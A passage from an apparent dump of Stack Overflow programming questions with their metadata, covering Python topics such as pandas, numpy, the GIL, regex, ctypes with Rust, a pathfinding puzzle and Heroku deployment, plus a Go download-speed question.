<pre><code>ValueError: 'z' is a bad directive in format '%a %b %m %Y %H:%M:%S %z %Z'
</code></pre>

<p>How to do it correctly?</p>
"
40072873,1858864.0,2016-10-16 16:54:29+00:00,3,"Why do we need locks for threads, if we have GIL?","<p>I believe it is a stupid question but I still can't find it. Actually it's better to separate it into two questions:</p>

<p>1) Am I right that we could have a lot of threads but because of GIL in one moment only one thread is executing?</p>

<p>2) If so, why do we still need locks? We use locks to avoid the case when two threads are trying to read/write some shared object, because of GIL twi threads can't be executed in one moment, can they?</p>
"
39947975,2287853.0,2016-10-09 20:02:15+00:00,3,counting back generations of a number,"<p>I am trying to reverse engineer a set of numbers given to me (f,m) I need to go through and find how many generations it takes starting from 1,1 using the algorithm below for each generation:</p>

<pre><code>x = 1
y = 1
new_generation = y+x
x OR y = new_generation
</code></pre>

<p>IE, I do not know if X, or Y is changed, the other variable is left the same... A list of possible outputs would look like this for the ending values of 4 and 7:</p>

<pre><code>f = 4
m = 7
[1, 1]
[2, 1, 1, 2]
[3, 1, 2, 3, 3, 2, 1, 3]
[4, 1, 3, 4, 5, 3, 2, 5, 5, 2, 3, 5, 4, 3, 1, 4]
[5, 1, 4, 5, **7, 4**, 3, 7, 7, 5, 2, 7, 7, 2, 5, 7, 7, 3, **4, 7**, 5, 4, 1, 5]
</code></pre>

<p>Where every two sets of numbers (2,1) and (1,2) are a possible output. Note the ** denote the answer (in this case the order doesn't matter so long as both m and f have their value in the list).</p>

<p>Clearly there is exponential growth here, so I can't (or it less efficient) to make a list and then find the answer; instead I am using the following code to reverse this process...</p>

<pre><code>def answer(m,f):
    #the variables will be sent to me as a string, so here I convert them...
    m = (int(m))
    f = (int(f))
    global counter
    #While I have not reduced my given numbers to my starting numbers....
    while m != 1 or f != 1:
        counter +=1
        #If M is greater, I know the last generation added F to M, so remove it
        if m &gt; f:
            m = m-f
        #If F is greater, I know the last generation added M to M, so remove it
        elif f &gt; m:
            f = f-m
        else:
            #They can never be the same (one must always be bigger, so if they are the same and NOT 1, it can't be done in any generation)
            return ""impossible""
    return str(counter)

print(answer(""23333"",""30000000000""))
</code></pre>

<p>This returns the correct answer (for instance, 4,7 returns ""4"" which is correct) but it takes to long when I pass larger numbers (I must be able to handle 10^50, insane amount, I know!). 
<hr>
My thought was I should be able to apply some mathematical equation to the number to reduce it and them multiple the generations, but I'm having trouble finding a way to do this that also holds the integrity of the answer (for instance, if I divide the bigger by the smaller, on small numbers (7, 300000) I get a very close (but wrong) answer, however on closer numbers such as (23333, 300000) the answer is no where even close, which makes sense due to the differences in the generation path). Note I have also tried this in a recursive function (to find generations) and using the a non-reversed method (building the list and checking the answer; which was significantly slower for obvious reasons)</p>

<p><hr>
Here are some test cases with their answers:</p>

<blockquote>
<pre><code>f = ""1""
m = ""2""
Output: ""1""

f = ""4""
m = ""7""
Output: ""4""

f = ""4""
m = ""2""
Output: ""impossible""
</code></pre>
</blockquote>

<p>Any help is much appreciated! P.S. I am running Python 2.7.6</p>

<p>[EDIT]
<hr>
The below code is working as desired.</p>

<pre><code>from fractions import gcd

def answer(m,f):
    #Convert strings to ints...
    m = (int(m))
    f = (int(f))

    #If they share a common denominator (GCD) return impossible
    if gcd(m,f) != 1:
        return ""impossible""
    counter = 0
    #While there is still a remainder...
    while m != 0 and f != 0:
        if m &gt; f:
            counter += m // f
            #M now equals the remainder.
            m %= f
        elif f &gt; m:
            counter += f // m
            f %= m
    return str(counter - 1)
</code></pre>
"
39888013,2719960.0,2016-10-06 05:15:54+00:00,3,How to unit test program interacting with block devices,"<p>I have a program that interacts with and changes block devices (/dev/sda and such) on linux. I'm using various external commands (mostly commands from the fdisk and GNU fdisk packages) to control the devices. I have made a class that serves as the interface for most of the basic actions with block devices (for information like: What size is it? Where is it mounted? etc.)</p>

<p>Here is one such method querying the size of a partition:</p>

<pre><code>def get_drive_size(device):
    """"""Returns the maximum size of the drive, in sectors.

    :device the device identifier (/dev/sda and such)""""""

    query_proc = subprocess.Popen([""blockdev"", ""--getsz"", device], stdout=subprocess.PIPE) 
    #blockdev returns the number of 512B blocks in a drive
    output, error = query_proc.communicate()
    exit_code = query_proc.returncode
    if exit_code != 0:
        raise Exception(""Non-zero exit code"", str(error, ""utf-8"")) #I have custom exceptions, this is slight pseudo-code

    return int(output) #should always be valid
</code></pre>

<p>So this method accepts a block device path, and returns an integer. The tests will run as root, since this entire program will end up having to run as root anyway.</p>

<p>Should I try and test code such as these methods? If so, how? I could try and create and mount image files for each test, but this seems like a lot of overhead, and is probably error-prone itself. It expects block devices, so I cannot operate directly on image files in the file system.</p>

<p>I could try mocking, as some answers suggest, but this feels inadequate. It seems like I start to test the implementation of the method, if I mock the Popen object, rather than the output. Is this a correct assessment of proper unit-testing methodology in this case?</p>

<p>I am using python3 for this project, and I have not yet chosen a unit-testing framework. In the absence of other reasons, I will probably just use the default unittest framework included in Python.</p>
"
39872981,2528453.0,2016-10-05 11:39:48+00:00,3,Efficient way for calculating selected differences in array,"<p>I have two arrays as an output from a simulation script where one contains IDs and one times, i.e. something like:</p>

<pre><code>ids = np.array([2, 0, 1, 0, 1, 1, 2])
times = np.array([.1, .3, .3, .5, .6, 1.2, 1.3])
</code></pre>

<p>These arrays are always of the same size. Now I need to calculate the differences of <code>times</code>, but only for those times with the same <code>ids</code>. Of course, I can simply loop over the different <code>ids</code> an do</p>

<pre><code>for id in np.unique(ids):
    diffs = np.diff(times[ids==id])
    print diffs
    # do stuff with diffs
</code></pre>

<p>However, this is quite inefficient and the two arrays can be very large. Does anyone have a good idea on how to do that more efficiently?</p>
"
39927318,6913219.0,2016-10-08 00:02:11+00:00,3,Creating a dictionary where the key is an integer and the value is the length of a random sentence,"<p>Super new to to python here, I've been struggling with this code for a while now. Basically the function returns a dictionary with the integers as keys and the values are all the words where the length of the word corresponds with each key.</p>

<p>So far I'm able to create a dictionary where the values are the total number of each word but not the actual words themselves.</p>

<p>So passing the following text</p>

<pre><code>""the faith that he had had had had an affect on his life""
</code></pre>

<p>to the function</p>

<pre><code>def get_word_len_dict(text):
    result_dict = {'1':0, '2':0, '3':0, '4':0, '5':0, '6' :0}
    for word in text.split():
        if str(len(word)) in result_dict:
            result_dict[str(len(word))] += 1
    return result_dict
</code></pre>

<p>returns</p>

<pre class=""lang-none prettyprint-override""><code>1 - 0
2 - 3
3 - 6
4 - 2
5 - 1
6 - 1
</code></pre>

<p>Where I need the output to be:</p>

<pre class=""lang-none prettyprint-override""><code>2 - ['an', 'he', 'on']
3 - ['had', 'his', 'the']
4 - ['life', 'that']
5 - ['faith']
6 - ['affect']
</code></pre>

<p>I think I need to have to return the values as a list. But I'm not sure how to approach it.</p>
"
40094588,664456.0,2016-10-17 19:54:32+00:00,3,How to get a list of matchable characters from a regex class,"<p>Given a regex character class/set, how can i get a list of all matchable characters (in python 3). E.g.:</p>

<pre><code>[\dA-C]
</code></pre>

<p>should give</p>

<pre><code>['0','1','2','3','4','5','6','7','8','9','A','B','C']
</code></pre>
"
39935030,4148612.0,2016-10-08 17:04:21+00:00,3,How to get a list of custom objects from Rust to Python with Ctypes?,"<p>I am trying to send an array of custom objects from Rust to Python as a result of a function call:</p>

<pre><code>pub struct Item {
    name: String,
    description: String,
    tags: Vec&lt;String&gt;
}

pub struct SearchResults {
    count: usize,
    results: Vec&lt;Item&gt;
}

fn get_content(url: &amp;str) -&gt; hyper::Result&lt;String&gt; {
    let client = Client::new();
    let mut response = try!(client.get(url).send());
    let mut buf = String::new();
    try!(response.read_to_string(&amp;mut buf));
    Ok(buf)
}

#[no_mangle]
pub unsafe extern fn get_search_results(search: &amp;str) -&gt; SearchResults {

    let mut url = String::from(""http://localhost:8080/search?q="");
    url.push_str(&amp;search);

    let content = get_content(&amp;url).unwrap();
    let j: Vec&lt;SearchResult&gt; = json::decode(&amp;content).unwrap();
    return SearchResults {count: j.len(), results: j};
}
</code></pre>

<p>And my Python code:</p>

<pre class=""lang-py prettyprint-override""><code>from ctypes import cdll, Structure, c_wchar_p, c_int, POINTER


class SearchResult(Structure):
    _fields_ = [(""name"", c_wchar_p), (""description"", c_wchar_p), (""tags"", POINTER(c_wchar_p))]


class SearchResults(Structure):
    _fields_ = [(""count"", c_int), (""results"", POINTER(SearchResult))]

lib = cdll.LoadLibrary(""target/release/libplugin_core.dylib"")

get_search_results = lib.get_search_results
get_search_results.restype = SearchResults

print(get_search_results(""test""))
</code></pre>

<p>When I run the Python code I get a malloc exception:</p>

<pre><code>malloc: *** mach_vm_map(size=140734736883712) failed (error code=3)
</code></pre>

<p>Probably missing a bunch of stuff in there.</p>
"
40140933,7044475.0,2016-10-19 20:27:27+00:00,3,"What do &=, |=, and ~ do in Pandas","<p>I frequently see code like this at work:</p>

<pre><code>overlap &amp;= group['ADMSN_DT'].loc[i] &lt;= group['epi_end'].loc[j]
</code></pre>

<p>My question is what do operators such as <code>&amp;=</code>, <code>|=</code>, and <code>~</code> do in pandas?</p>
"
39650397,3835277.0,2016-09-22 23:35:31+00:00,3,Is there a faster way to make GET requests in Go?,"<p>Consider this program:</p>

<pre><code>package main

import (
    ""net/http""
    ""os""
)

var url = ""https://upload.wikimedia.org/wikipedia/commons/f/fe/FlumeRide%2C_Liseberg_-_last_steep_POV.ogv""

func main() {
    response, _ := http.Get(url)
    defer response.Body.Close()

    f, _ := os.Create(""output.ogv"")
    defer f.Close()

    _, err = io.Copy(f, response.Body)
}
</code></pre>

<p>It has the same functionality as <code>wget $url</code> and takes ~<strong>7.3 seconds</strong> to run (for me). <code>wget</code> takes only ~<strong>4.6 seconds</strong>. Why the huge discrepancy? This trivial Python program, which loads the entire video into memory before writing it to disk, takes around <strong>5.2 seconds</strong>:</p>

<pre><code>import requests

url = ""https://upload.wikimedia.org/wikipedia/commons/f/fe/FlumeRide%2C_Liseberg_-_last_steep_POV.ogv""

def main():
    r = requests.get(url)
    with open('output.ogv','wb') as output:
        output.write(r.content)

if __name__ == ""__main__"":
    main()
</code></pre>

<h1>Profiling</h1>

<p>I've investigated this quite a bit. Here are some approaches I've taken:</p>

<ol>
<li>Use different buffer sizes in <code>io.Copy</code></li>
<li>Use other Readers/Writers</li>
<li>Concurrency / parallelism</li>
<li>Downloading larger files</li>
</ol>

<h3>Different buffer sizes</h3>

<p>I tried many different buffer sizes using <code>io.CopyBuffer</code>, and I found that the default buffer size of 32KB leaves me with the best speeds (which are still 1.6 to 1.8 times slower than <code>wget</code> and Python's <code>reqeusts</code>).</p>

<h3>Other Readers/Writers</h3>

<p>All of the other readers and writers were negligibly slower than using <code>io.Copy</code>. I tried using <code>(f *File) Write</code> and some other buffered readers/writers.</p>

<h3>Concurrency / Parallelism</h3>

<p>I even wrote a fairly long program that uses <code>range</code> in headers to download this file in parallel, but as expected I didn't seem any remarkable improvements in speed.</p>

<h3>Larger files</h3>

<p>I downloaded a file more than three times as large as this one, and my Go implementation is still 1.5 to 2 times slower than wget and requests.</p>

<h1>Other Things of Note</h1>

<ol>
<li>I'm building a binary before timing anything.</li>
<li>The vast majority of the time is spent on actually writing/copying <code>response.Body</code>. The part seems to account for all but ~0.3 seconds of elapsed time, regardless of how large the file I'm downloading is.</li>
</ol>

<hr>

<p>So what am I doing wrong? Should I just expect GET requests to take this much longer in Go?</p>
"
40101873,2496988.0,2016-10-18 07:16:15+00:00,3,how to analyze the value of tfidf matrix in sklearn?,"<p>I am using sklearn KMeans algorithm for document clustering as guided in 
<a href=""http://brandonrose.org/clustering"" rel=""nofollow"">http://brandonrose.org/clustering</a></p>

<p>Here There is a calculation of TFIDF matrix. I have understood the concept behind the TFIDF technique.
But, when I printed this Matrix in the given program, The matrix is like this,</p>

<pre><code>  (0, 11)   0.238317554822
  (0, 34)   0.355850989305
  (0, 7)    0.355850989305
  (0, 21)   0.238317554822
  (0, 16)   0.355850989305
  (0, 35)   0.355850989305
  (0, 8)    0.355850989305
  (0, 17)   0.355850989305
  (0, 36)   0.355850989305
  (1, 11)   0.238317554822
  (1, 21)   0.238317554822
  (1, 23)   0.355850989305
  (1, 0)    0.355850989305
  (1, 24)   0.355850989305
  (1, 12)   0.355850989305
  (1, 22)   0.355850989305
  (1, 25)   0.355850989305
  (1, 13)   0.355850989305
  (2, 2)    0.27430356415
  (2, 18)   0.339992197465
  (2, 26)   0.339992197465
  (2, 39)   0.339992197465
  (2, 3)    0.339992197465
  (2, 19)   0.339992197465
  (2, 27)   0.339992197465
  (2, 4)    0.339992197465
  (2, 20)   0.339992197465
  (3, 2)    0.27430356415
  (3, 40)   0.339992197465
  (3, 9)    0.339992197465
  (3, 1)    0.339992197465
  (3, 5)    0.339992197465
  (3, 41)   0.339992197465
  (3, 10)   0.339992197465
  (3, 6)    0.339992197465
  (3, 42)   0.339992197465
  (4, 11)   0.202877476983
  (4, 21)   0.202877476983
  (4, 28)   0.302932576437
  (4, 31)   0.302932576437
  (4, 37)   0.302932576437
  (4, 14)   0.302932576437
  (4, 29)   0.302932576437
  (4, 32)   0.302932576437
  (4, 38)   0.302932576437
  (4, 15)   0.302932576437
  (4, 30)   0.302932576437
  (4, 33)   0.302932576437
</code></pre>

<p>What values this matrix is representing. ? can anybody worked on this can help me to understand this ?</p>
"
39948902,4724693.0,2016-10-09 21:49:24+00:00,3,How to generate all possible combinations of 0-1 matrix in Python?,"<p>How can generate all possible combinations of a 0-1 matrix of size K by N?</p>

<p>For example, if I take K=2 and N=2, I get the following combinations.</p>

<pre><code>combination 1
[0, 0;
 0, 0]; 
combination 2
[1, 0;
 0, 0]; 
combination 3
[0, 1;
 0, 0]; 
combination 4
[0, 0;
 1, 0]; 
combination 5
[0, 0;
 0, 1]; 
combination 6
[1, 1;
 0, 0]; 
combination 7
[1, 0;
 1, 0]; 
combination 8
[1, 0;
 0, 1]; 
combination 9
[0, 1;
 1, 0]; 
combination 10
[0, 1;
 0, 1]; 
combination 11
[0, 0;
 1, 1]; 
combination 12
[1, 1;
 1, 0]; 
combination 13
[0, 1;
 1, 1]; 
combination 14
[1, 0;
 1, 1]; 
combination 15
[1, 1;
 0, 1]; 
combination 16
[1, 1;
 1, 1]; 
</code></pre>
"
39949113,3502100.0,2016-10-09 22:18:21+00:00,3,Path-finding through one obstacle (Google Foobar: Prepare the Bunnies' Escape),"<p>I'm having trouble solving a Google Foobar question involving path-finding. My solution fails 2 test cases, the inputs and outputs of which are hidden.</p>

<h1>The prompt:</h1>

<blockquote>
  <p>You have maps of parts of the space station, each starting at a prison
  exit and ending at the door to an escape pod. The map is represented
  as a matrix of 0s and 1s, where 0s are passable space and 1s are
  impassable walls. The door out of the prison is at the top left (0,0)
  and the door into an escape pod is at the bottom right (w-1,h-1). </p>
  
  <p>Write a function answer(map) that generates the length of the shortest
  path from the prison door to the escape pod, where you are allowed to
  remove one wall as part of your remodeling plans. The path length is
  the total number of nodes you pass through, counting both the entrance
  and exit nodes. The starting and ending positions are always passable
  (0). The map will always be solvable, though you may or may not need
  to remove a wall. The height and width of the map can be from 2 to 20.
  Moves can only be made in cardinal directions; no diagonal moves are
  allowed.</p>
  
  <h1>Test cases</h1>
  
  <p>Inputs:
      <code>(int) maze = [[0, 1, 1, 0], [0, 0, 0, 1], [1, 1, 0, 0], [1, 1, 1, 0]]</code></p>
  
  <p>Output:
      <code>(int) 7</code></p>
  
  <p>Inputs:
      <code>(int) maze = [[0, 0, 0, 0, 0, 0], [1, 1, 1, 1, 1, 0], [0, 0, 0, 0, 0, 0], [0, 1, 1, 1, 1, 1], [0, 1, 1, 1, 1, 1], [0, 0, 0, 0, 0, 0]]</code></p>
  
  <p>Output:
      <code>(int) 11</code></p>
</blockquote>

<h1>My code:</h1>

<pre><code>from queue import PriorityQueue

# Grid class
class Grid:
    # Initialized with dimensions to check later if all neighbor points are actually within the graph
    def __init__(self, width, height):
        self.width = width
        self.height = height
        self.walls = []
        self.weights = {}
        self.wall_count = 0

    # Find the cost of a certain destination node
    # Cost is reported as a tuple to account for going across a wall: (# of moves through a wall, # of normal moves)
    def cost(self, from_node, to_node):
        if to_node in self.walls:
            return self.weights.get(to_node, (1, 0))
        else:
            return self.weights.get(to_node, (0, 1))

    # Check if the location is actually within the graph
    def in_bounds(self, id):
        (x, y) = id
        return 0 &lt;= x &lt; self.width and 0 &lt;= y &lt; self.height

    # Find the adjacent nodes of a node (ie. the places it can go to)
    # Filters out any result which isn't on the graph using self.in_bounds
    def neighbors(self, id):
        (x, y) = id
        results = [(x+1, y), (x, y-1), (x-1, y), (x, y+1)]
        if (x + y) % 2 == 0: results.reverse() # aesthetics
        results = filter(self.in_bounds, results)
        return results

# Find the dimensions of the 2D list by finding the lengths of the outer and inner lists
def dimensions_2d(xs):
    width = len(xs)
    height = len(xs[0])
    return (width, height)

# Returns all the positions of an element in a 2D list
# In this case it's used to find all walls (occurences of 1) to pass to the Grid object
def index_2d(xs, v):
    results = [(x, y) for y, ls in enumerate(xs) for x, item in enumerate(ls) if item == v]
    return results

# Djikstra search algorithm; mistakenly named ""a_star"" before
# Returns both a dictionary of ""destination"" locations to ""start"" locations (tuples) as well as a dictionary of the calculated cost of each location on the grid
def djikstra_search(graph, start, goal):
    # Priority Queue to select nodes from
    frontier = PriorityQueue()
    # Place our starting cost in
    frontier.put(start, (0, 0))

    came_from = {}
    cost_so_far = {}
    came_from[start] = None
    cost_so_far[start] = (0, 0)

    while not frontier.empty():
        # Get the element with the highest priority from the queue
        current = frontier.get()

        if current == goal:
            break

        # For every neighbor of the selected node
        for next in graph.neighbors(current):
            # The new cost of the neighbor node is current cost plus cost of this node - (1, 0) if it goes through a wall, (0, 1) otherwise
            new_cost = (cost_so_far[current][0] + graph.cost(current, next)[0], cost_so_far[current][1] + graph.cost(current, next)[1])
            # If the node has not cost currently
            # OR if the number of walls traveled through is less than the current cost
            # AND if the number of normal steps taken is less than or the same as the current number
            if next not in cost_so_far or (new_cost[0] &lt; cost_so_far[next][0] and sum(new_cost) &lt;= sum(cost_so_far[next])):
                # Record it in both the cost and came_from dicts
                cost_so_far[next] = new_cost
                # Place the cost in the queue
                priority = new_cost
                frontier.put(next, priority)
                came_from[next] = current

    return came_from, cost_so_far

# Find the length of the calculated path
# Using the returned list of edges from djikstra_search, move backwards from the target end and increment the length until the start element is reached
def path(grid, start, end):
    # Perform the search
    path = djikstra_search(grid, start, end)
    search = path[0]

    # If the end element's cost travels through more than 1 wall return 0
    if path[1].get(end)[0] &gt; 1:
        return 0

    # Otherwise move backwards from the end element and increment length each time
    # Once the start element has been reached, we have our final length
    length = 1
    last = end
    while last != start:
        last = search.get(last)
        length += 1

    return length

# The ""main"" function
def answer(maze):
    # Find all occurences of walls (1) in the 2D list
    walls = index_2d(maze, 1)
    # Find the x and y dimensions of the maze (required for the Grid object)
    dims = dimensions_2d(maze)
    # Create a new grid with our found dimensions
    grid = Grid(dims[0], dims[1])

    # The start point will always be at (0,0) and the end will always be at the bottom-right so we define those here
    start = (0, 0)
    end   = (dims[0] - 1, dims[1] - 1)

    # the walls variable's locations are flipped, so reverse each of them to get the right wall positions
    grid.walls = [(y, x) for x, y in walls]

    # Return the length
    return path(grid, start, end)
</code></pre>

<p>In my own testing (grids up to 7x7) this solution seems to work without problems.</p>

<p>Any help (or failing cases) would be much appreciated!</p>
"
39855732,4214922.0,2016-10-04 15:03:18+00:00,3,Python - Change variable outside function without return,"<p>I just started learning Python and I ran into this problem. I want to set a variable from inside a method, but the variable is outside the method. </p>

<p>The method gets activated by a button. Then I want to get the value from that variable that I set when I press another button. The problem is that the value that I put inside a variable from inside the method doesn't stay. How would I solve this? </p>

<p>The code is underneath. <code>currentMovie</code> is the variable I try to change. When I press the button with the method <code>UpdateText()</code>, it prints out a random number like it is supposed to. But when I press the button that activates <code>UpdateWatched()</code> it prints out 0. So I am assuming the variable never gets set.</p>

<pre><code>import random
from tkinter import *

currentMovie = 0

def UpdateText():
    currentMovie = random.randint(0, 100)
    print(currentMovie)

def UpdateWatched():
    print(currentMovie)

root = Tk()
root.title(""MovieSelector9000"")
root.geometry(""900x600"")
app = Frame(root)
app.grid()
canvas = Canvas(app, width = 300, height = 75)
canvas.pack(side = ""left"")
button1 = Button(canvas, text = ""SetRandomMovie"", command = UpdateText)
button2 = Button(canvas, text = ""GetRandomMovie"", command = UpdateWatched)
button1.pack(anchor = NW, side = ""left"")
button2.pack(anchor = NW, side = ""left"")
root.mainloop()
</code></pre>
"
39899005,213334.0,2016-10-06 14:42:52+00:00,3,How to flatten a pandas dataframe with some columns as json?,"<p>I have a dataframe <code>df</code> that loads data from a database. Most of the columns are json strings while some are even list of jsons. For example:</p>

<pre><code>id     name     columnA                               columnB
1     John     {""dist"": ""600"", ""time"": ""0:12.10""}    [{""pos"": ""1st"", ""value"": ""500""},{""pos"": ""2nd"", ""value"": ""300""},{""pos"": ""3rd"", ""value"": ""200""}, {""pos"": ""total"", ""value"": ""1000""}]
2     Mike     {""dist"": ""600""}                       [{""pos"": ""1st"", ""value"": ""500""},{""pos"": ""2nd"", ""value"": ""300""},{""pos"": ""total"", ""value"": ""800""}]
...
</code></pre>

<p>AS you can see, all the rows don't have the same number of elements in the json strings for a column. </p>

<p>What I need to do is keep the normal columns like <code>id</code> and <code>name</code>, as it is and flatten the json columns like so</p>

<pre><code>id    name   columnA.dist   columnA.time   columnB.pos.1st   columnB.pos.2nd   columnB.pos.3rd     columnB.pos.total
1     John   600            0:12.10        500               300               200                 1000 
2     Mark   600            NaN            500               300               Nan                 800 
</code></pre>

<p>I have tried using <code>json_normalize</code> like so</p>

<pre><code>from pandas.io.json import json_normalize
json_normalize(df)
</code></pre>

<p>But there seems to be some problems with <code>keyerror</code>. What is the correct way of doing this?</p>
"
40068605,4836299.0,2016-10-16 08:59:45+00:00,3,Scatter and Hist in one subplot in Python,"<p>Here is code</p>

<pre><code>    df = pd.DataFrame(3 * np.random.rand(4, 2), columns=['a', 'b'])
    plt.subplot(121)
    df[""a""].plot.box()
    plt.subplot(122)
    df.plot.scatter(x=""a"", y=""b"")
    plt.show()
</code></pre>

<p>Output comes in two different windows as follows:-</p>

<p>Figure 1
<a href=""https://i.stack.imgur.com/OFZeu.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/OFZeu.png"" alt=""Figure 1""></a></p>

<p>Figure 2
<a href=""https://i.stack.imgur.com/yjYPP.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/yjYPP.png"" alt=""Figure 2""></a></p>

<p>Although both should come in one window. Any advice where is mistake</p>
"
39900493,1849187.0,2016-10-06 15:50:33+00:00,3,Pandas pivot_table do not comply with values order,"<p>I have an issue with pandas pivot_table.</p>

<p>Sometimes, the order of the columns specified on ""values"" list does not match</p>

<pre><code>In [11]: p = pivot_table(df, values=[""x"",""y""], cols=[""month""], 
                             rows=""name"", aggfunc=np.sum)
</code></pre>

<p>i get the wrong order (y,x) instead of (x,y)</p>

<pre><code>Out[12]:
        y           x
month   1   2   3   1   2   3
name
a       1 NaN   7   2 NaN   8
b       3 NaN   9   4 NaN  10
c     NaN   5 NaN NaN   6 NaN
</code></pre>

<p>Is there something i don't do well ?</p>
"
39641568,1585017.0,2016-09-22 14:17:00+00:00,3,How do I run two processes in Procfile?,"<p>I have a Flask app where I have embedded a Bokeh server graph and I am not being able to have them both working on Heroku. I am trying to deploy on Heorku and I can either start the Bokeh app or the Flask app from the Procfile, but not both at the same time. Consequently, either the content served with Flask will show, or the Bokeh graph. </p>

<p>When I deploy with the following line in Procfile, the Bokeh content shows up on the webpage, but not nothing from Flask:</p>

<pre><code>web: bokeh serve --port=$PORT --host=bokehapp.herokuapp.com --host=* --address=0.0.0.0 --use-xheaders bokeh_script.py
</code></pre>

<p>If I deploy with the following, I only get the Flask content, not the Bokeh graph:</p>

<pre><code>web: gunicorn app:app
</code></pre>

<p>In the second case, I am starting Bokeh inside the app.py Flask script using a subprocess:</p>

<pre><code>bokeh_process = subprocess.Popen(
    ['bokeh', 'serve','--allow-websocket-origin=bokehapp.herokuapp.com','--log-level=debug','standard_way_with_curdoc.py'], stdout=subprocess.PIPE)
</code></pre>

<p>The Heroku logs don't show any errors.</p>

<p>I also tried a third alternative:</p>

<pre><code>web: bokeh serve --port=$PORT --host=bokehapp.herokuapp.com --host=* --address=0.0.0.0 --use-xheaders bokeh_script.py
web: gunicorn app:app
</code></pre>

<p>And that shows Flask content only. It seems only second worker is being considered.</p>

<p>So, my question is how modify the Procfile to consider both processes? 
Or maybe I am approaching this wrong all together? Any clue you can give would be appreciated. </p>
"
39876136,1099682.0,2016-10-05 14:04:21+00:00,3,"Efficient converting of numpy int array with shape (M, N, P) array to 2D object array with (N, P) shape","<p>From a 3D array with the shape (M, N, P) of data type <code>int</code>, I would like to get a 2D array of shape (N, P) of data type <code>object</code> and have this done with reasonable efficiency.</p>

<p>I'm happy with the objects being of either <code>tuple</code>, <code>list</code> or <code>numpy.ndarray</code> types.</p>

<p>I have a working hack of a solution where I have to go via a list. So it feels like I'm missing something:</p>

<pre><code>import numpy as np

m = np.mgrid[:8, :12]

l = zip(*(v.ravel() for v in m))
a2 = np.empty(m.shape[1:], dtype=np.object)
a2.ravel()[:] = l
</code></pre>

<p>The final array <code>a2</code>, in this example, should have the property that <code>a2[(x, y)] == (x, y)</code></p>

<p>It feels like it should have been possible to transpose <code>m</code> and make <code>a2</code> like this:</p>

<p><code>a2 = m.transpose(1,2,0).astype(np.object).reshape(m.shape[1:])</code></p>

<p>since numpy doesn't really care about what's inside the objects or alternatively when creating a numpy-array of type <code>np.object</code> be able to tell how many dimensions there should be:</p>

<pre><code>a2 = np.array(m.transpose(1,2,0), astype=object, ndim=2)
</code></pre>

<p>Numpy knows to stop before the final depth of nested iterables if they have different shape at the third dimension (in this example), but since <code>m</code> doesn't have irregularities, this seems impossible.</p>

<p>Or create <code>a2</code> and fill it with the transposed:</p>

<pre><code>a2 = np.empty(m.shape[1:], dtype=np.object)
a2[...] = m.transpose(1, 2, 0)
</code></pre>

<p>In this case e.g. <code>m.transpose(1, 2, 0)[2, 4]</code> is <code>np.array([2, 4])</code> and assigning it to <code>a2[2, 4]</code> would have been perfectly legal. However, none of these three more reasonable attempts work.</p>
"
39900061,6915161.0,2016-10-06 15:30:05+00:00,3,Sort lists in a Pandas Dataframe column,"<p>I have a Dataframe column which is a collection of lists</p>

<pre><code>    a
['a', 'b']
['b', 'a']
['a', 'c']
['c', 'a']
</code></pre>

<p>I would like to use this list to group by its unique values (['a', 'b'] &amp; ['a', 'c']). However, this generates an error </p>

<pre><code>TypeError: unhashable type: 'list'
</code></pre>

<p>Is there any way around this. Ideally I would like to sort the values in place and create an additional column of a concatenated string.</p>
"
39683153,2353897.0,2016-09-25 03:39:58+00:00,3,Is there a good way to find the rank of a matrix in a field of characteristic p>0?,"<p>I need an efficient algorithm or a known way to determine <a href=""https://en.wikipedia.org/wiki/Rank_(linear_algebra)"" rel=""nofollow"">the mathematical rank</a> of a matrix A with coefficients in a field of positive characteristic. </p>

<p>For example, in the finite field of 5 elements I have the following matrix:</p>

<pre><code>import numpy
A=[[2,3],[3,2]]
print numpy.linalg.matrix_rank(A)
</code></pre>

<p>This method gives me the result of 2, but in characteristic 5 this matrix has rank 1 since <code>[2,3]+[3,2]=[0,0]</code>.</p>
"
40069151,2336654.0,2016-10-16 10:14:38+00:00,3,count the number of groups of consecutive digits in a series of strings,"<p>consider the <code>pd.Series</code> <code>s</code></p>

<pre><code>import pandas as pd
import numpy as np

np.random.seed([3,1415])
p = (.35, .35, .1, .1, .1)
s = pd.DataFrame(np.random.choice(['', 1] + list('abc'), (10, 20), p=p)).sum(1)

s

0    11111bbaacbbca1
1    1bab111aaaaca1a
2    11aaa1b11a11a11
3     1ca11bb1b1a1b1
4        bb1111b1111
5       b1111c1aa111
6     1b1a111b11b1ab
7        1bc111ab1ba
8      a11b1b1b11111
9        1cc1ab1acc1
dtype: object
</code></pre>

<hr>

<p>I'm looking to count the number of groups of consecutive digits in each element of <code>s</code>.  Or, how many integers are in each string.</p>

<p>I'd expec the result to look like</p>

<pre><code>0    2
1    3
2    5
3    6
4    2
5    3
6    5
7    3
8    4
9    4
dtype: int64
</code></pre>

<p>I'm looking for efficiency, though elegance is important too.</p>
"
39654646,5488248.0,2016-09-23 07:05:24+00:00,3,Finding multiple repetitions of smaller lists in a large cumulative list,"<p>I have a large list of strings, for eg:</p>

<pre><code>full_log = ['AB21','BG54','HG89','NS72','Error','CF54','SD62','KK02','FE34']
</code></pre>

<p>and multiple small list of strings, for eg:</p>

<pre><code>tc1 = ['HG89','NS72']
tc2 = ['AB21','BG54']
tc3 = ['KK02','FE34']
tc4 = ['CF54','SD62']
</code></pre>

<p>I want to find each of this smaller lists in the larger list maintaining the sequence, so that the output would be something like:</p>

<pre><code>tc2-tc1-Er-tc4-tc3
</code></pre>

<p>I want to know if there is any straight forward, pythonic way of dealing with this situation.</p>
"
39899451,1953800.0,2016-10-06 15:02:29+00:00,3,Match Making using GAE + ndb,"<p>I have a game in which users contact a server to find a user of their level who wants to play a game. Here is the basic architecture of a game request.</p>

<p><a href=""http://i.stack.imgur.com/vMIHi.jpg"" rel=""nofollow""><img src=""http://i.stack.imgur.com/vMIHi.jpg"" alt=""enter image description here""></a></p>

<p>I am using <code>ndb</code> to store a waiting queue for each user level in the Google DataStore.</p>

<p>I am accessing these queues by their keys to ensure strong consistency (per <a href=""https://cloud.google.com/datastore/docs/articles/balancing-strong-and-eventual-consistency-with-google-cloud-datastore/#eventual-consistency-in-cloud-datastore"" rel=""nofollow"">this article</a>). The entities are stored in the queue using a repeated (list of) <a href=""https://cloud.google.com/appengine/docs/python/ndb/entity-property-reference#types"" rel=""nofollow"">LocalStructuredProperty</a>.</p>

<p>Questions:</p>

<ol>
